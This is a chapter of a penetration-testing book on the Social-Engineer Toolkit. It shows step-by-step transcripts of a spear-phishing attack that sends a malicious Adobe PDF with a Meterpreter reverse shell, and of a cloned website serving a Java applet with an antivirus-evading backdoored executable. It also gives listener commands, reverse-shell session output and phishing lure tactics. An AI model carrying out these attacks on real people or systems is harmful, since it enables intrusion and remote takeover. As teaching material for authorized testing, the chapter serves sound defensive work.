<html><head></head><body><section epub:type="chapter" id="the_social-engineer_toolkit"><div class="titlepage"><div class="book"><div class="book"><h2 class="title1">Chapter 10. The Social-Engineer Toolkit</h2></div></div></div><p class="calibre2">The Social-Engineer Toolkit (SET) was developed to coincide with the release of Social-Engineer.org, a set of resources conceived by Chris Hadnagy (loganWHD) and written by one of this book’s authors, David Kennedy. The site offers a centralized location for social-engineering tutorials and explains terminologies, definitions, and scenarios that can help prepare you for hacking the human mind.<a id="IDX-CHP-10-0001" class="strong"/><a id="IDX-CHP-10-0002" class="strong"/><a id="IDX-CHP-10-0003" class="strong"/><a id="IDX-CHP-10-0004" class="strong"/></p><p class="calibre2">The purpose of SET is to fill a gap in the penetration testing community and bring awareness to social-engineering attacks. And it has succeeded —  SET has been downloaded 1 million times and is now an industry standard for deploying social-engineering attacks. The toolkit attacks human weaknesses, exploiting curiosity, credibility, avarice, and simple human stupidity. Social-engineering attacks are at an all-time high and have always been a large risk for many organizations.</p><p class="calibre2">Of course, social engineering is nothing new. One person trying to coax another to perform acts that he normally wouldn’t do is as old as time itself. Many in the security community believe that social engineering is one of the biggest risks organizations face, because it’s extremely difficult to protect organizations from being attacked in this way. (You might remember the ultrasophisticated Operation Aurora attack, for example, in which social-engineering was used to attack Gmail and other sources of Google data.)<a id="IDX-CHP-10-0005" class="strong"/><a id="IDX-CHP-10-0006" class="strong"/><a id="IDX-CHP-10-0007" class="strong"/><a id="IDX-CHP-10-0008" class="strong"/><a id="IDX-CHP-10-0009" class="strong"/><a id="IDX-CHP-10-0010" class="strong"/><a id="IDX-CHP-10-0011" class="strong"/><a id="IDX-CHP-10-0012" class="strong"/><a id="IDX-CHP-10-0013" class="strong"/></p><p class="calibre2">An <span class="strong"><em class="calibre4">attack vector</em></span> is the avenue used to gain information or access to a system. SET categorizes attacks by attack vector (such as web, email, and USB-based attacks). It uses email, spoofed websites, and other vectors to reach human targets, typically tricking individuals into compromising the target or releasing sensitive information. Naturally, each vector can have a different success rate depending on its target and the communication used. SET also comes prebuilt with email and website templates that can be used for social-engineering attacks. SET heavily uses the Metasploit Framework.</p><p class="calibre2">Because of the social nature of the attacks themselves, each example in this chapter is coupled with a brief story.</p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="configuring_the_social-engineer_toolkit">Configuring the Social-Engineer Toolkit</h2></div></div></div><p class="calibre2">By default, in Back|Track, SET is located in the <span class="strong"><em class="calibre4">/pentest/exploits/set/</em></span> directory. Before you begin, make sure that you are running the latest version of SET.</p><a id="I_programlisting10_d1e11381" class="strong"/><pre class="programlisting">root@bt:/pentest/exploits/set# <strong class="calibre3"><code class="calibre6">svn update</code></strong></pre><p class="calibre2">Next, configure your SET configuration file according to what you’re attempting to accomplish. We’ll cover a couple of simple features within the configuration file <span class="strong"><em class="calibre4">config/set_config</em></span> within the root SET directory.</p><p class="calibre2">When using the SET web-based attack vectors, you can turn <code class="literal">ON</code> the <code class="literal">WEBATTACK_EMAIL</code> flag to perform email phishing in conjunction with the web attack. This flag is turned <code class="literal">OFF</code> by default, which means that you will configure SET and use the web attack vector without the support of email phishing.<a id="IDX-CHP-10-0014" class="strong"/></p><a id="I_programlisting10_d1e11404" class="strong"/><pre class="programlisting">METASPLOIT_PATH=/opt/framework3/msf3

WEBATTACK_EMAIL=ON</pre><p class="calibre2">One of the web-based attacks available in SET is the <span class="strong"><em class="calibre4">Java applet attack</em></span>, which uses self-signed Java applets. By default, this attack uses <span class="strong"><em class="calibre4">Microsoft</em></span> as the publisher name; however, if the Java Development Kit (JDK) has been installed, you can turn this option <code class="literal">ON</code> and sign the applet with whatever name you want. When you turn this flag <code class="literal">ON</code>, additional options will be available through the interface.<a id="IDX-CHP-10-0015" class="strong"/></p><a id="I_programlisting10_d1e11423" class="strong"/><pre class="programlisting">SELF_SIGNED_APPLET=ON</pre><p class="calibre2">The <code class="literal">AUTO_DETECT</code> setting is one of the most important flags and is turned <code class="literal">ON</code> by default. It tells SET to detect your local IP address automatically and to use that as the address for the reverse connection and web servers. If you are using multiple interfaces or your reverse payload listener is housed at a different location, turn this flag <code class="literal">OFF</code>. When this option is <code class="literal">OFF</code>, SET will allow you to specify multiple scenarios to ensure that the proper IP address scheme is used, for example, in a scenario that includes NAT and port forwarding. These options are reflected within the SET interface.<a id="IDX-CHP-10-0016" class="strong"/><a id="IDX-CHP-10-0017" class="strong"/><a id="IDX-CHP-10-0018" class="strong"/><a id="IDX-CHP-10-0019" class="strong"/><a id="IDX-CHP-10-0020" class="strong"/><a id="IDX-CHP-10-0021" class="strong"/><a id="IDX-CHP-10-0022" class="strong"/></p><a id="I_programlisting10_d1e11469" class="strong"/><pre class="programlisting">AUTO_DETECT=OFF</pre><p class="calibre2">When you use the toolkit, by default it uses a built-in Python web-based server. To optimize performance, set the <code class="literal">APACHE_SERVER</code> flag to <code class="literal">ON</code>, and SET will use Apache for the attacks.</p><a id="I_programlisting10_d1e11480" class="strong"/><pre class="programlisting">APACHE_SERVER=ON</pre><p class="calibre2">Those are the basics of the configuration file. As you can see, you can significantly change SET’s behavior depending on which flags are set in the tool. Now let’s run the tool.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="spear-phishing_attack_vector">Spear-Phishing Attack Vector</h2></div></div></div><p class="calibre2">The <span class="strong"><em class="calibre4">spear-phishing attack vector</em></span> specially crafts file-format exploits (such as Adobe PDF exploits) and primarily sends email attacks containing attachments to a target, which, when opened, compromise the target’s machine. SET can use Simple Mail Transport Protocol (SMTP) open relays (both anonymous and credentialed), Gmail, and Sendmail to send email. SET can also use standard email or HTML-based email to perform the phishing attack.<a id="IDX-CHP-10-0023" class="strong"/></p><p class="calibre2">Let’s consider a real-world penetration test targeting the company CompanyXYZ. You register a domain name similar to Company XYZ, say <span class="strong"><em class="calibre4">coompanyxyz.com</em></span>. You then register the subdomain <span class="strong"><em class="calibre4">coom.panyXYZ.com</em></span>. Next, you send a spear-phishing attack to the target organization, knowing that most employees only glance at email and will open any attachment that appears to be legitimate. In this case, we will send a PDF file format bug to our target, like so.</p><a id="I_programlisting10_d1e11503" class="strong"/><pre class="programlisting">root@bt:/pentest/exploits/set# <strong class="calibre3"><code class="calibre6">./set</code></strong>

  Select from the menu:

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 1.  Spear-Phishing Attack Vectors
  2.  Website Attack Vectors
  3.  Infectious Media Generator
  4.  Create a Payload and Listener
  5.  Mass Mailer Attack
  6.  Teensy USB HID Attack Vector
  7.  SMS Spoofing Attack Vector
  8.  Wireless Access Point Attack Vector
  9.  Third Party Modules
  10. Update the Metasploit Framework
  11. Update the Social-Engineer Toolkit
  12. Help, Credits, and About
  13. Exit the Social-Engineer Toolkit

  Enter your choice: <strong class="calibre3"><code class="calibre6">1</code></strong>

  Welcome to the SET E-Mail attack method. This module allows you
  to specially craft email messages and send them to a large (or small)
  number of people with attached fileformat malicious payloads. If you
  want to spoof your email address, be sure "Sendmail" is installed (it
  is installed in BT4) and change the config/set_config SENDMAIL=OFF flag
  to SENDMAIL=ON.

  There are two options, one is getting your feet wet and letting SET do
  everything for you (option 1), the second is to create your own FileFormat
  payload and use it in your own attack. Either way, good luck and enjoy!

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/>1. Perform a Mass Email Attack
  2. Create a FileFormat Payload
  3. Create a Social-Engineering Template
  4. Return to Main Menu

  Enter your choice: <strong class="calibre3"><code class="calibre6">1</code></strong>

  Select the file format exploit you want.
  The default is the PDF embedded EXE.

  ********** PAYLOADS **********

  1.  SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP)
  2.  SET Custom Written Document UNC LM SMB Capture Attack
  3.  Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow
  4.  Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087)
  5.  Adobe Flash Player 'Button' Remote Code Execution
  6.  Adobe CoolType SING Table 'uniqueName' Overflow
  7.  Adobe Flash Player 'newfunction' Invalid Pointer Use
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> 8.  Adobe Collab.collectEmailInfo Buffer Overflow
  9.  Adobe Collab.getIcon Buffer Overflow
  10. Adobe JBIG2Decode Memory Corruption Exploit
  11. Adobe PDF Embedded EXE Social Engineering
  12. Adobe util.printf() Buffer Overflow
  13. Custom EXE to VBA (sent via RAR) (RAR required)
  14. Adobe U3D CLODProgressiveMeshDeclaration Array Overrun
  15. Adobe PDF Embedded EXE Social Engineering (NOJS)
  16. Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow
  17. Nuance PDF Reader v6.0 Launch Stack Buffer Overflow

  Enter the number you want (press enter for default): <strong class="calibre3"><code class="calibre6">8</code></strong>

  1. Windows Reverse TCP Shel              Spawn a command shell
 on victim and send back to
                                               attacker.
  2. Windows Meterpreter Reverse_TCP       Spawn a
 meterpreter shell on victim and send back
                                               to attacker.
  3. Windows Reverse VNC DLL               Spawn a VNC server
 on victim and send back to
                                               attacker.
  4. Windows Reverse TCP Shell (x64)       Windows X64 Command Shell,
 Reverse TCP Inline
  5. Windows Meterpreter Reverse_TCP (X64) Connect back to the attacker (Windows x64),
                                               Meterpreter
  6. Windows Shell Bind_TCP (X64)          Execute payload and
 create an accepting port on
                                               remote system.
  7. Windows Meterpreter Reverse HTTPS     Tunnel communication
 over HTTP using SSL and use
                                               Meterpreter.

<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> Enter the payload you want (press enter for default):
  [*] Windows Meterpreter Reverse TCP selected.
  Enter the port to connect back on (press enter for default):
  [*] Defaulting to port 443...
  [*] Generating fileformat exploit...
  [*] Please wait while we load the module tree...
  [*] Started reverse handler on 10.10.1.112:443
  [*] Creating 'template.pdf' file...
  [*] Generated output file /pentest/exploits/set/src/program_junk/template.pdf
  [*] Payload creation complete.
  [*] All payloads get sent to the src/msf_attacks/template.pdf directory
  [*] Payload generation complete. Press enter to continue.

  As an added bonus, use the file-format creator in SET to create your attachment.
  Right now the attachment will be imported with filename of 'template.whatever'
  Do you want to rename the file?
  example Enter the new filename: moo.pdf

<img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/> 1. Keep the filename, I don't care.
  2. Rename the file, I want to be cool.

  Enter your choice (enter for default): <strong class="calibre3"><code class="calibre6">1</code></strong>
  Keeping the filename and moving on.</pre><p class="calibre2">From the SET main menu, select <code class="literal">Spear-Phishing Attack Vectors</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11556" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> followed by <code class="literal">Perform a Mass Email Attack</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11565" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>. This attack infects a PDF file using the Adobe <code class="literal">Collab.collectEmailInfo</code> vulnerability <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11575" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>, a Metasploit Meterpreter reverse payload <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11581" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> that is the SET default. <code class="literal">Collab.collectEmailInfo</code> is a heap-based exploit that, if opened (and if the target’s version of Adobe Acrobat is vulnerable to this exploit), will connect to the attacking workstation on port 443, which usually allows outbound traffic from most networks.<a id="IDX-CHP-10-0024" class="strong"/><a id="IDX-CHP-10-0025" class="strong"/><a id="IDX-CHP-10-0026" class="strong"/><a id="IDX-CHP-10-0027" class="strong"/></p><p class="calibre2">You are also given the option of renaming the malicious file to make it more enticing for the target to open. The default name (<span class="strong"><em class="calibre4">template.pdf</em></span>) is selected <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11607" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> in this scenario for demonstration purposes.</p><a id="I_programlisting10_d1e11613" class="strong"/><pre class="programlisting">Social Engineer Toolkit Mass E-Mailer

  There are two options on the mass e-mailer, the first would
  be to send an email to one individual person. The second option
  will allow you to import a list and send it to as many people as
  you want within that list.

  What do you want to do:

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 1. E-Mail Attack Single Email Address
  2. E-Mail Attack Mass Mailer
  3. Return to main menu.

  Enter your choice: <strong class="calibre3"><code class="calibre6">1</code></strong>

  Do you want to use a predefined template or craft
  a one time email template.

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 1. Pre-Defined Template
  2. One-Time Use Email Template

  Enter your choice: <strong class="calibre3"><code class="calibre6">1</code></strong>
  Below is a list of available templates:

  1: New Update
  2: Computer Issue
  3: Strange internet usage from your computer
  4: LOL...have to check this out...
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> 5: Status Report
  6: Pay Raise Application Form
  7: WOAAAA!!!!!!!!!! This is crazy...
  8: BasketBall Tickets
  9: Baby Pics
  10: Have you seen this?
  11: Termination List
  12: How long has it been?
  13: Dan Brown's Angels &amp; Demons

  Enter the number you want to use: <strong class="calibre3"><code class="calibre6">5</code></strong>

<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> Enter who you want to send email to: <strong class="calibre3"><code class="calibre6">ihazomgsecurity@secmaniac.com</code></strong>

  What option do you want to use?

  1. Use a GMAIL Account for your email attack.
  2. Use your own server or open relay

  Enter your choice: <strong class="calibre3"><code class="calibre6">1</code></strong>
<img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre7"/> Enter your GMAIL email address: <strong class="calibre3"><code class="calibre6">fakeemailaddy@gmail.com</code></strong>
  Enter your password for gmail (it will not be displayed back to you):

  SET has finished delivering the emails.</pre><p class="calibre2">Next we email this attack to a single email address <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11666" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> using the SET predefined email template <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11672" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> <code class="literal">Status Report</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11681" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span>. Finally, we enter the email address (<strong class="calibre3"><code class="calibre6">ihazomgsecurity@secmaniac.com</code></strong>) <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11691" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span> to send the malicious file to and have SET use a Gmail account <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11697" class="strong"/><img src="../images/00007.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867468.png" class="calibre8"/></span> to send the message.<a id="IDX-CHP-10-0028" class="strong"/></p><p class="calibre2">Finally, create a Metasploit listener for the payload to connect back to <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11708" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>. When SET launches Metasploit, it configures all the necessary options and starts to listen on your attacking IP address on port 443 <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11714" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, as configured earlier.<a id="IDX-CHP-10-0029" class="strong"/></p><a id="I_programlisting10_d1e11723" class="strong"/><pre class="programlisting"><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> Do you want to setup a listener yes or no: <strong class="calibre3"><code class="calibre6">yes</code></strong>

  resource (src/program_junk/meta_config)&gt; use exploit/multi/handler
  resource (src/program_junk/meta_config)&gt; set PAYLOAD windows/meterpreter/reverse_tcp
  PAYLOAD =&gt; windows/meterpreter/reverse_tcp
  resource (src/program_junk/meta_config)&gt; set LHOST 10.10.1.112
  LHOST =&gt; 10.10.1.112
  resource (src/program_junk/meta_config)&gt; set LPORT 443
  LPORT =&gt; 443
  resource (src/program_junk/meta_config)&gt; set ENCODING shikata_ga_nai
  ENCODING =&gt; shikata_ga_nai
  resource (src/program_junk/meta_config)&gt; set ExitOnSession false
  ExitOnSession =&gt; false
  resource (src/program_junk/meta_config)&gt; exploit -j
  [*] Exploit running as background job.
<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> [*] Started reverse handler on 10.10.1.112:443
  [*] Starting the payload handler...
  msf exploit(handler) &gt;</pre><p class="calibre2">We’ve just set up an attack against <span class="strong"><a class="xref" href="mailto:ihazomgsecurity@secmaniac.com">ihazomgsecurity@secmaniac.com</a></span>, crafted an email to the recipient, and used an Adobe file format exploit. SET allowed us to create templates and have them dynamically imported when we use the tool. When the target opens the email and double-clicks the Adobe file, he’ll see something like <a class="xref" href="part0014.html#the_targetas_view_of_the_infected_pdf_fi">Figure 10-1</a>.<a id="IDX-CHP-10-0030" class="strong"/></p><div class="figure"><a id="the_targetas_view_of_the_infected_pdf_fi" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject10_d1e11753" class="strong"/><img src="../images/00039.jpeg" alt="The target’s view of the infected PDF file" hisrc="httpatomoreillycomsourcenostarchimages867532.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 10-1. The target’s view of the infected PDF file</div></div><p class="calibre2">The target opens the PDF thinking it’s legitimate, and his system is instantly compromised. On the attacker’s side, you see the following:<a id="IDX-CHP-10-0031" class="strong"/><a id="IDX-CHP-10-0032" class="strong"/><a id="IDX-CHP-10-0033" class="strong"/><a id="IDX-CHP-10-0034" class="strong"/></p><a id="I_programlisting10_d1e11774" class="strong"/><pre class="programlisting">[*] Started reverse handler on 10.10.1.112:443
[*] Starting the payload handler...
msf exploit(handler) &gt; [*] Sending stage (748032 bytes) to 10.10.1.102
[*] Meterpreter session 1 opened (10.10.1.112:443 -&gt; 10.10.1.102:58087)

msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 1</code></strong>
[*] Starting interaction with 1...

meterpreter &gt; <strong class="calibre3"><code class="calibre6">shell</code></strong>
Process 2976 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Bob\Desktop&gt;</pre><p class="calibre2">This example used a spear-phishing attack to target one user, but SET can also be used to attack multiple targets using the “mass email” option. You can also create customized templates that can be reused, instead of using the prebuilt templates included in SET.</p></div><div class="book"><div class="titlepage"><div class="book"><div class="book"><h2 class="title2" id="web_attack_vectors">Web Attack Vectors</h2></div></div></div><p class="calibre2">Web attack vectors are probably one of the most advanced and exciting aspects of SET, because they are specifically crafted to be believable and enticing to the target. SET can clone websites that look identical to trusted sites, helping to ensure that the target will think he is visiting a legitimate site.<a id="IDX-CHP-10-0035" class="strong"/><a id="IDX-CHP-10-0036" class="strong"/></p><div class="book"><div class="titlepage"><div class="book"><div class="book"><h3 class="title3" id="java_applet">Java Applet</h3></div></div></div><p class="calibre2">The Java applet attack is one of the most successful attack vectors in SET. The applet itself was created by one of the SET developers, Thomas Werth. This attack introduces a malicious Java applet that does smart browser detection (so your exploit works) and delivers a payload to a target’s machine. The Java applet attack is not considered a vulnerability by Java. When a target browses the malicious site, he is presented with a warning asking if he wants to run an untrusted Java applet. Because Java allows you to sign an applet with any name you choose, you could call the publisher Google, Microsoft, or any other string you choose. By editing the <span class="strong"><em class="calibre4">set_config</em></span> file and setting <code class="literal">WEBATTACK_EMAIL</code> to <code class="literal">ON</code>, you can also incorporate mass emails with this attack.<a id="IDX-CHP-10-0037" class="strong"/><a id="IDX-CHP-10-0038" class="strong"/><a id="IDX-CHP-10-0039" class="strong"/><a id="IDX-CHP-10-0040" class="strong"/></p><p class="calibre2">Let’s walk through a real-world example — a penetration test performed for a Fortune 1000 company. First, a copycat domain name, similar to that of the actual company website, was registered. Next, the attacker scraped the Internet looking for <span class="strong"><em class="calibre4">@&lt;company&gt;.com</em></span> email addresses using the harvester module within Metasploit. After extracting 200 email addresses from public websites, mass emails were sent to these addresses. The attack email claimed to be from the company’s communications department and asked the employee to look at the newly designed corporate website. Each email was personalized with the recipient’s name and claimed that the employee could click a link to see a picture of himself on the corporate home page. The email said that this new website displayed the employee’s photograph as a testimony to his hard work. Curiosity and fear were the prime motivators in getting each target to click the URL immediately.</p><p class="calibre2">After the target clicked the link, a Java applet notification popped up, signed by the employee’s corporation. The target clicked the run command because the notification looked legitimate; however, the command was based on the cloned site under the fake domain. Even though the employees didn’t see their pictures, they were presented with a website that looked legitimate, not realizing that their machines had been compromised: When the user clicked Run on the Java applet security prompt, a payload was executed and a shell delivered to the attacker. Once the payload was executed, the target was redirected back to the legitimate site.</p><p class="calibre2">SET can be used to clone a website and rewrite portions of it so that when a target visits the malicious site it looks identical to the original site. Let’s see how we could set up this attack on a fictitious site, <a class="xref" href="http://www.secmaniac.com/" target="_top">http://www.secmaniac.com/</a>, in SET:</p><a id="I_programlisting10_d1e11840" class="strong"/><pre class="programlisting">root@bt:/pentest/exploits/set# <strong class="calibre3"><code class="calibre6">./set</code></strong>

  Select from the menu:

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> 2.  Website Attack Vectors

  Enter your choice: <strong class="calibre3"><code class="calibre6">2</code></strong>

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> 1. The Java Applet Attack Method

  Enter your choice (press enter for default): <strong class="calibre3"><code class="calibre6">1</code></strong>

  The first method will allow SET to import a list of pre-defined
  web applications that it can utilize within the attack.

  The second method will completely clone a website of your choosing
  and allow you to utilize the attack vectors within the completely
  same web application you were attempting to clone.

  The third method allows you to import your own website, note that you
  should only have an index.html when using the import website
  functionality.

  [!] Website Attack Vectors [!]

  1. Web Templates
<img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre7"/> 2. Site Cloner
  3. Custom Import
  4. Return to main menu

  Enter number (1-4): <strong class="calibre3"><code class="calibre6">2</code></strong>

  SET supports both HTTP and HTTPS
  Example: http://www.thisisafakesite.com
<img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre7"/> Enter the url to clone: <strong class="calibre3"><code class="calibre6">http://www.secmaniac.com</code></strong>

  [*] Cloning the website: http://www.secmaniac.com
  [*] This could take a little bit...
  [*] Injecting Java Applet attack into the newly cloned website.
  [*] Filename obfuscation complete. Payload name is: 0xvV3cYfbLBI3
  [*] Malicious java applet website prepped for deployment</pre><p class="calibre2">To begin this attack scenario, select <code class="literal">Website Attack Vectors</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11887" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> from the SET main menu. Use the <code class="literal">Java Applet Attack Method</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11896" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span>, and then choose <code class="literal">Site Cloner</code> <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11906" class="strong"/><img src="../images/00005.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867464.png" class="calibre8"/></span> from the subsequent menu. Finally, tell SET to clone the SecManiac website <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11912" class="strong"/><img src="../images/00006.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867466.png" class="calibre8"/></span>.<a id="IDX-CHP-10-0041" class="strong"/><a id="IDX-CHP-10-0042" class="strong"/><a id="IDX-CHP-10-0043" class="strong"/></p><a id="I_programlisting10_d1e11927" class="strong"/><pre class="programlisting">What payload do you want to generate:

  Name:                                      Description:

  2. Windows Reverse_TCP Meterpreter         Spawn a meterpreter
 shell on victim and send
                                                 back to attacker.

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> Enter choice (hit enter for default):

  Below is a list of encodings to try and bypass AV.

  Select one of the below, 'backdoored executable' is typically the best.

  16. Backdoored Executable (BEST)

<img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre7"/> Enter your choice (enter for default):
  [-] Enter the PORT of the listener (enter for default):

  [-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...
  [-] Backdoor completed successfully. Payload is now hidden
 within a legit executable.

  ********************************************************
  Do you want to create a Linux/OSX reverse_tcp payload
  in the Java Applet attack as well?
  ********************************************************

  Enter choice yes or no: <strong class="calibre3"><code class="calibre6">no</code></strong>

  ***************************************************
  Web Server Launched. Welcome to the SET Web Attack.
  ***************************************************

  [--] Tested on IE6, IE7, IE8, Safari, Chrome, and FireFox [--]

  [*] Launching MSF Listener...
  [*] This may take a few to load MSF...</pre><p class="calibre2">As with other SET attack methods, attackers can use a variety of payloads. The default reverse Meterpreter payload <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11946" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span> is usually an excellent selection. For this scenario, you can simply select the defaults when prompted for the encoder to use <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11952" class="strong"/><img src="../images/00004.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867462.png" class="calibre8"/></span> and the port to use to reconnect.<a id="IDX-CHP-10-0044" class="strong"/></p><p class="calibre2">With the configuration complete, SET launches Metasploit:</p><a id="I_programlisting10_d1e11963" class="strong"/><pre class="programlisting">resource (src/program_junk/meta_config)&gt; exploit -j
  [*] Exploit running as background job.

<img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre7"/> [*] Started reverse handler on 10.10.1.112:443
  [*] Starting the payload handler...
  msf exploit(handler) &gt;</pre><p class="calibre2">SET passes all necessary options to Metasploit, which then sets up the reverse Meterpreter listener on port 443 <span class="inlinemediaobject"><a id="I_inlinemediaobject10_d1e11974" class="strong"/><img src="../images/00002.gif" alt="" hisrc="httpatomoreillycomsourcenostarchimages867458.png" class="calibre8"/></span>.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">You have created a web server housing a cloned instance of <a class="xref" href="http://www.secmaniac.com/" target="_top">http://www.secmaniac.com/</a>. If you had changed the configuration file to include <code class="literal">WEBATTACK_EMAIL=ON</code>, you would have been prompted to send an email using the spear-phishing attack vector (minus attachments).<a id="IDX-CHP-10-0045" class="strong"/></p></div><div class="book"><hr class="calibre5"/></div><p class="calibre2">Now that everything is set up, you simply need to get a target to browse to the malicious site. Upon reaching the website, the target sees a pop-up warning from the publisher, Microsoft, as shown in <a class="xref" href="part0014.html#java_applet_prompt">Figure 10-2</a>. If the target clicks Run, and most users will, the payload will be executed, and you gain full control of the user’s system.</p><div class="book"><hr class="calibre5"/></div><div class="note"><h3 class="title4">Note</h3><p class="calibre2">Recall that SET’s configuration can self-sign the Java applet with whatever you want. Remember, too, that when the target clicks Run and the payload is executed and delivered, the target is redirected to the legitimate SecManiac website.</p></div><div class="book"><hr class="calibre5"/></div><div class="figure"><a id="java_applet_prompt" class="strong"/><div class="book"><div class="book"><a id="I_mediaobject10_d1e12001" class="strong"/><img src="../images/00040.jpeg" alt="Java applet prompt" hisrc="httpatomoreillycomsourcenostarchimages867534.png.jpg" class="calibre7"/></div></div><div class="figure-title">Figure 10-2. Java applet prompt</div></div><p class="calibre2">Back at our attacker machine, the Meterpreter session is successfully established, and we now have access to the target’s machine as shown here.<a id="IDX-CHP-10-0046" class="strong"/><a id="IDX-CHP-10-0047" class="strong"/></p><a id="I_programlisting10_d1e12014" class="strong"/><pre class="programlisting">msf exploit(handler) &gt; [*] Sending stage (748032 bytes) to 10.10.1.102
[*] Meterpreter session 1 opened (10.10.1.112:443 -&gt; 10.10.1.102:58550)

msf exploit(handler) &gt; <strong class="calibre3"><code class="calibre6">sessions -i 1</code></strong>
[*] Starting interaction with 1...

shellmeterpreter &gt; <strong class="calibre3"><code class="calibre6">shell</code></strong>
Process 2800 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

